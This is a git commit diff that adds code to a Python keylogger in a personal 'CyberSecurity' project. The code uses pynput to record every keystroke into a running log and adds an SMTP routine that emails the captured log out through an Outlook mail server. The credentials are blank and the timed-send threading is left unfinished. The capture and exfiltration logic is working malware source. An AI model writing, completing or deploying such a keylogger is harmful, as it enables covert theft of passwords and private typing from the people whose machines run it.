34786af86dc3b6773b916fa908fb87dc581169de
OsiBK <osman_bayram-fb@hotmail.com>
2024-01-11 17:41:58 +0300

    Part of keylogger

--- CyberSecurity/KeyLogger/KeyLogger.py
+++ CyberSecurity/KeyLogger/KeyLogger.py
@@ -1,10 +1,52 @@
 import pynput.keyboard
+import smtplib
+import threading
+import time
+
+log = ""
 
 def CallbackFunction(key):
-    print(key)
+
+    global log
+
+    try:
+        log = log + str(key.char)
+        #log = log + key.char.encode("utf-8")
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log+ str(key)
+    except:
+        pass
+
+    print(log)
+
+def SendEmail(email, password, message):
+
+    emailServer = smtplib.SMTP("smtp-mail.outlook.com", 587)
+    emailServer.starttls()
+    emailServer.login(email, password)
+    emailServer.sendmail(email, email, message)
+    emailServer.quit()
 
 keyloggerListener = pynput.keyboard.Listener(on_press=CallbackFunction)
 
+def ThreadFunction():
+
+    global log
+    SendEmail("", "", log)
+    log = ""
+    timerObject
+
+
+
 #threading
 with keyloggerListener:
+
+    ThreadFunction()
     keyloggerListener.join()
+
+
+
+
